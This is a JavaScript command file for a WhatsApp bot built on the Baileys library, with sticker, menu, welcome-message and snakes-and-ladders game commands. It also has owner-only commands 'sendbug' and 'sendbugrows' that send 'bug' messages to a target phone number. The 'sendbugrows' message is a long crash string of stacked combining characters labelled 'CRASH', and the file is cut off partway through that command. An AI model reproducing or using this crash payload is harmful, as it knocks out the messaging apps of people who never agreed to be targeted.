/**
         [ CREDITS ]
         * Coding by @rifza.p.p
         * @ YT : https://youtube.com/channel/UCEyVimXfcw-vL3TLSNxlyRQ
         * @ YT CHANNEL : ꪶꫂꬅ꤃ϝᎥґꪜꫂ 🅥 
         * @ WhatsApp : wa.me/6287708357324
  */  
  /**
         [ CREDITS ] || [ THANKS TO ]
         * @rifza.p.p
         * @Deff
         * @adiwajshing/baileys
         * Dan beberapa pembuat code lain...
         * Maaf jika ada nama yang tidak dicantumkan disini         
  */
  const SETTING = require('../lib/validator/config')
  
  //=======================================================//
                      /* { module } */
  //=======================================================//
  const chalk = SETTING.modul.chalk
  const fs = SETTING.modul.fs
  const util = SETTING.modul.util
  const https = SETTING.modul.https
  const axios = SETTING.modul.axios
  const ytsr = SETTING.modul.ytsr
  const { spawn, exec } = SETTING.modul.child
  const { downloadContentFromMessage, MessageType, generateWAMessageFromContent, proto } = SETTING.modul.baileys
  const { GRIS, SearchResult } = SETTING.modul.gris
  const moment = SETTING.modul.time
  const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
  const qrcode = SETTING.modul.qrcode
  const QrCode = SETTING.modul.QrCode
  const qr = new QrCode();
  const speed = SETTING.modul.speed
  const request = SETTING.modul.request
  const path = SETTING.modul.path

   //=======================================================//
                       /* { js } */
   //=======================================================//

  const { color, bgcolor, ConsoleLog, biocolor } = require('../lib/color')
  const { reSize, runtime, getBuffer, getRandom, pickRandom, fetchJson } = require('../lib/function')
  const { imgSuper } = require('../lib/SCRAPER/ephoto')
  const { makeWelcome } = require('../lib/SCRAPER/welcome.js')
  const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif, writeExifStc } = require('../lib/exif')
  const { remove, unscreen } = require('../lib/SCRAPER/removebg')
  const { welcomeJSON } = require('../storage_cabinets/D-B/fetchLocationJson.js')
  const { pinterest } = require('../lib/SCRAPER/pinterest') 
  const { youtube, searchResult } = require('../lib/SCRAPER/ytdl')
  const { TelegraPh } = require('../lib/SCRAPER/telegraph')
  const { TiktokDownloader } = require('../lib/SCRAPER/tiktokdl')
  const { goLens } = require('../lib/SCRAPER/goLens')
  const { ephoto } = require('../lib/SCRAPER/ephoto')
  const Menu_List = require('../lib/validator/menu')
  const { ulartangga } = require('./game/ulartangga')
  //=======================================================//
                       /* { media } */
  //=======================================================//

  const thumb = fs.readFileSync("./storage_cabinets/image/thumb.jpg")
  const sesiGame = './storage_cabinets/D-B/ulartangga/'

  //=======================================================//
                         /* { database } */
  //=======================================================//

  const welcomeJson = welcomeJSON
  let depo = []

//=======================================================//
                       /* { exports this function } */
//=======================================================//

module.exports = async(msg, client, from, store) => {
    
    //=======================================================//
                          /* { detect } */  
    //=======================================================//
   const banChats = SETTING.banchats
   const CMD = (msg.xtype === 'conversation' && msg.message.conversation) ? msg.message.conversation : (msg.xtype == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (msg.xtype == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (msg.xtype == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
   const prefix = /^[#!.,®©¥€¢£/\∆✓]/.test(CMD) ? CMD.match(/^[#!.,®©¥€¢£/\∆✓]/gi) : '#'   
   const chatmessage = (msg.xtype === 'conversation' && msg.message.conversation) ? msg.message.conversation : (msg.xtype == 'imageMessage') ? msg.message.imageMessage.caption : (msg.xtype == 'videoMessage') ? msg.message.videoMessage.caption : (msg.xtype == 'extendedTextMessage') ? msg.message.extendedTextMessage.text : (msg.xtype == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : (msg.xtype == 'listResponseMessage') ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : (msg.xtype == 'templateButtonReplyMessage') ? msg.message.templateButtonReplyMessage.selectedId : (msg.xtype === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId || msg.text) : ''
   const ordermessage = (msg.xtype === 'conversation' && msg.message.conversation) ? msg.message.conversation : (msg.xtype == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (msg.xtype == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (msg.xtype == 'extendedTextMessage') && msg.message.extendedTextMessage.text.startsWith(prefix) ? msg.message.extendedTextMessage.text : (msg.xtype == 'buttonsResponseMessage') && msg.message.buttonsResponseMessage.selectedButtonId.startsWith(prefix) ? msg.message.buttonsResponseMessage.selectedButtonId : (msg.xtype == 'listResponseMessage') && msg.message.listResponseMessage.singleSelectReply.selectedRowId.startsWith(prefix) ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : (msg.xtype == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId.startsWith(prefix) ? msg.message.templateButtonReplyMessage.selectedId : ''   
   const chats = (msg.xtype === 'conversation' && msg.message.conversation) ? msg.message.conversation : (msg.xtype == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (msg.xtype == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (msg.xtype == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (msg.xtype == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (msg.xtype == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (msg.xtype == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''   	
   const args = ordermessage.trim().split(/ +/).slice(1)         
   const order = ordermessage.slice(0).trim().split(/ +/).shift().toLowerCase()	   
   const command = ordermessage.slice(1)
   const q = args.join(' ')     
   const isCmd = ordermessage.startsWith(prefix)   
   const orderPlugins = isCmd ? ordermessage.slice(1).trim().split(/ +/).shift().toLowerCase() : null
   const isGroup = from.endsWith('@g.us')
   const botNumber = client.user.id.split(':')[0] + '@s.whatsapp.net'
   const isMedia = (msg.xtype === 'imageMessage' || msg.xtype === 'videoMessage')
   const itulho = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid  
   const isOwner = [botNumber, ...global.ownerNumber].map(jid => jid.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(itulho)
   const groupMetdata = isGroup ? await client.groupMetadata(from) : ''
   const groupMembers = isGroup ? groupMetdata.participants : ''
   const groupName = isGroup ? await groupMetdata.subject : ''   
   const groupAdmins = isGroup ? msg.getGroupAdmins(groupMembers) : ''
   const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
   const isGroupAdmins = groupAdmins.includes(msg.sender)
   const isWelcome = isGroup ? welcomeJson.includes(from) : false
			
   //=======================================================//
                    /* { quoted } */  
    //=======================================================//

   let quoted_ = require('../lib/PRECISAR/precisar')
   let { pek, kon, fkontak, bugRows, contact } = quoted_
   msg.pek = pek(thumb)
   msg.kon = kon(from)
   msg.fpay = client.fpay()
   msg.fkontak = fkontak(from)
   msg.bugRows = bugRows()
   msg.bugpay = client.bugpay()
      
   //=======================================================//
                    /* { participant mentions } */   
   //=======================================================//

   const mentionByTag = msg.xtype == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
   const mentionByreply = msg.xtype == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""       
   const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
          mention != undefined ? mention.push(mentionByreply) : []
   const mentionUser = mention != undefined ? mention.filter(n => n) : []    
 
  //=======================================================//
                          /* { function } */   
   //=======================================================//

   const sleep = async (ms) => {
       return new Promise(resolve => setTimeout(resolve, ms))
   }
    
   async function ReadJsonUT(ID){
    const read = JSON.parse(fs.readFileSync(sesiGame + ID + '.json'))        
    return read
   }
   
   //** plugins
   for (let name in plugins) {
                let plugin = plugins[name]              
                if (plugin.order && plugin.order.includes(orderPlugins)) {
                    let turn = plugin.order instanceof Array
                        ? plugin.order.includes(orderPlugins)
                        : plugin.order instanceof String
                            ? plugin.order == orderPlugins
                            : false
                    if (!turn) continue
          await plugin.exec(msg, client, from, { q, args, order })
       }
   }
              

                   
   //=======================================================//
                          /* { game } */   
                     //\\ ULAR TANGGA //\
   //=======================================================//      
    ulartangga(from, msg, client, chatmessage)
  
     //true = self / false = public
     if (banChats === true) { if(!isOwner && !msg.key.fromMe) return }    
     //console cmd
     if (isCmd && !isGroup) {
        console.log('\x1b[1;34m~\x1b[1;37m>', '[\x1b[1;33mCMD\x1b[1;37m]', time, color(`${prefix + command} [${args.length}]`, 'gray'), 'from', color(msg.pushName))
     }
     if (isCmd && isGroup) {
       console.log('\x1b[1;34m~\x1b[1;37m>', '[\x1b[1;33mCMD\x1b[1;37m]', time, color(`${prefix + command} [${args.length}]`, 'gray'), 'from', color(msg.pushName), 'in', color(groupName, 'orange'))
     }
   
   //=======================================================//
                         /* { cases } */   
   //=======================================================//

    switch(order){
      
      case prefix+'public':{
         if(!isOwner) return msg.reply('Khusus owner!!!!')
           SETTING.banchats = false
          msg.reply('[ PUBLIC - MODE ]')
         }
      break
       //
  
      break
       case prefix+'delsesiut':{
       LoaD = await ReadJsonUT(from)
       nu = './storage_cabinets/D-B/ulartangga/' + from + '.json'
       client.DeleteMessage(LoaD.key, botNumber).then(() => {
       msg.reply('success') 
       fs.unlinkSync(nu)   
       })
           
      }
      break   
      //
      case prefix+'self':{
         if(!isOwner) return msg.reply('Khusus owner!!!!')
             SETTING.banchats = true
          msg.reply('[ SELF MODE ]')
        }
      break
      // 
      case prefix+'ulartangga':{
       if(fs.existsSync('./storage_cabinets/D-B/ulartangga/' + from + '.json')) return msg.reply('Masih ada permainan disini!')
       if(msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return msg.reply('tag orang yang ingin anda ajak bermain!')
        let PL = mentionByTag[0]? mentionByTag[0] : mentionByreply ? mentionByreply : q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`                        
        playersUT1 = msg.sender
        playersUT2 = PL
        ID_UT = from
        turnUT = playersUT2
        try { ppus1 = await client.profilePictureUrl(msg.sender, "image") } catch { ppus1 = 'https://telegra.ph/file/42d2a0e0881e349806028.jpg'}   
        try { ppus2 = await client.profilePictureUrl(PL, "image") } catch { ppus2 = 'https://telegra.ph/file/265c672094dfa87caea19.jpg'}           
        let resz1 = await reSize(ppus1, 34, 34)
        let resz2 = await reSize(ppus2, 34, 34)
        randpic1 = await getRandom('.jpg')
        randpic2 = await getRandom('.jpg')
        randTemp = await getRandom('.jpg')
        await fs.writeFileSync('./storage_cabinets/image/' + randpic1, resz1)
        await fs.writeFileSync('./storage_cabinets/image/' + randpic2, resz2)        
        const pic1 = './storage_cabinets/image/' + randpic1    
        const pic2 = './storage_cabinets/image/' + randpic2
        const templatePath = './storage_cabinets/image/' + randTemp
        sesi = { 
            gilir: 0,
            key: [],
            template: templatePath,
            player1: { 
              id: playersUT1,
              jalan: 1,
              picture: pic1
            },
              player2: { 
              id: playersUT2,           
              setuju: false,
              jalan: 1,
              picture: pic2
            }
        }
             fs.writeFileSync(`./storage_cabinets/D-B/ulartangga/${from}.json`, JSON.stringify(sesi, null, 2))        
             client.sendMessage(from, { text: ` @${msg.sender.split("@")[0]} Mengajak @${PL.split("@")[0]} untuk bermain 🐍 ulartangga bersama\n\nKetik : Y [ Untuk Menyetujui]\nKetik : N [ Untuk Menolak ]`, mentions: [PL, msg.sender]},{quoted:msg})
         }
      break
      case prefix+'t':{
      ah = []
      let anu = await client.sendMessage(from, { text: 'tes' },{quoted:msg})      
      await ah.push(anu.key.id)
      let oek = await client.sendMessage(from, { text: 'tes' },{quoted:msg})
      await ah.push(oek.key.id)
      let ek = await client.sendMessage(from, { text: 'tes' },{quoted:msg})
      await ah.push(ek.key.id)
     client.DeleteMessage(ah, botNumber)
     
      }
      break
      //
      case prefix+'s': case prefix+'stiker': case prefix+'setiker': case prefix+'sticker':{
          if ((isMedia && !msg.message.videoMessage || msg.isQuotedImage) && args.length == 0) {
            client.sendMessage(from, { react: { text: "⏱️", key: msg.key }})
             var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
             var buffer = Buffer.from([])
               for await(const chunk of stream) {
                  buffer = Buffer.concat([buffer, chunk])
               }
             let buffers = await writeExifImg(buffer, { packname: SETTING.packname, author: SETTING.author })
           await client.sendMessage(from, { sticker: { url: buffers } }, { quoted: msg })
          } else if ((isMedia && msg.message.videoMessage.seconds < 11 || msg.isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
              client.sendMessage(from, { react: { text: "⏱️", key: msg.key }})
                var stream = await downloadContentFromMessage(msg.message.videoMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
                var buffer = Buffer.from([])
                  for await(const chunk of stream) {
                     buffer = Buffer.concat([buffer, chunk])
                  }
             let buffers = await writeExifVid(buffer, { packname: SETTING.packname, author: SETTING.author })
           await client.sendMessage(from, { sticker: { url: buffers } }, { quoted: msg })
           } else { msg.reply(`Reply gambar/video/sticker dengan caption ${prefix + 'sticker'} \n*(MAKSIMAL 10 DETIK!)*`) }
         }
       break
       //
      case prefix+'welcome':{
          if (!isGroup) return msg.reply('Khusus Group!') 
          if (!msg.key.fromMe && !isOwner && !isGroupAdmins) return msg.reply("Khusus admin!")
   		  if (!args[0]) return msg.reply('ON || OFF')
          if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
       	       if (isWelcome) return msg.reply('Sudah aktif✓')
		               welcomeJson.push(from)
		               fs.writeFileSync('./message/group/welcome.json', JSON.stringify(welcomeJson))
			        msg.reply('Suksess mengaktifkan welcome di group:\n'+groupName)
			   } else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
						welcomeJson.splice(from, 1)
						fs.writeFileSync('./message/group/welcome.json', JSON.stringify(welcomeJson))
		          	msg.reply('Success menonaktifkan welcome di group:\n'+groupName)
		       } else { msg.reply('Kata kunci tidak ditentukan!') }
	      }
       break
       //
      case prefix+'m': case prefix+'menu':{//Rfz XM
           client.sendMessage(from, { react: { text: "⏱️", key: msg.key }})
             let { menu } = Menu_List
             let runTime = runtime(process.uptime())
             let botName = SETTING.botname
             let AMOUNT = 1
             let buttons = [ {buttonId: `#owner`, buttonText: {displayText: 'Owner'}, type: 1}]
             let doc = fs.readFileSync("./storage_cabinets/document/Xilver-Moods.whatsappBot.xlsx")
             let fileName = `${msg.sayingtime + msg.timoji + ' ' + msg.pushName}.xlsx`
             let fileLength = 77627262726
             let caption = '© XilverMoods - By @rifza.p.p'
             let footer = menu(AMOUNT, msg, prefix, runTime, botName, SETTING)                                  
             let boddy = `Nodejs WhatsApp using @adiwajshing/baileys`
             let thumbnail = fs.readFileSync("./storage_cabinets/image/thumb.jpg")
             let thumbnailUrl = 'https://i.top4top.io/p_2396tjns31.jpeg'
             let sourceUrl =  'https://instagram.com/rifza.p.p'
             let mediaUrl = 'https://instagram.com/rifza.p.p'                            
           client.sendMenuDoc(from, doc, fileName, fileLength, caption, footer, time, buttons, boddy, thumbnail, thumbnailUrl, sourceUrl, mediaUrl, { quoted : msg.fpay })
          }
        break
        //
        case prefix+'sendbug':{
           if(!q) return msg.reply("Masukan nomer target")
           if(!isOwner) return msg.reply("Khusus Owner!") 
           try{
              await msg.reply("Sending...")
                 let Pe = mentionByTag[0]? mentionByTag[0] : mentionByreply ? mentionByreply : q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
                 await client.sendMessage(Pe, { text: "halo" }, {quoted:msg.bugpay})
                 client.sendMessage(from, { text: `Berhasil mengirim Bug ke Nomer @${Pe.split("@")[0]}`, mentions: [Pe] }, { quoted : msg.fpay }) 
             } catch (err){ console.log(err)
                 msg.reply("Gagal mengirim bug, Terjadi Error")
             }
           }
         break
          //
         case prefix+'sendbugrows':{
            if(!isOwner) return msg.reply("Khusus Owner!") 
            try{
               await msg.reply("Sending...")
               let Pe = mentionByTag[0]? mentionByTag[0] : mentionByreply ? mentionByreply : q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
                // send a list message!
                const sections = msg.bugRows
                const listMessage = {
                  text: "🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̵̵̡̰̣͕̹̤͖̬̹̖̦͍̬̦̐̀̕͢͢͜͠͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ 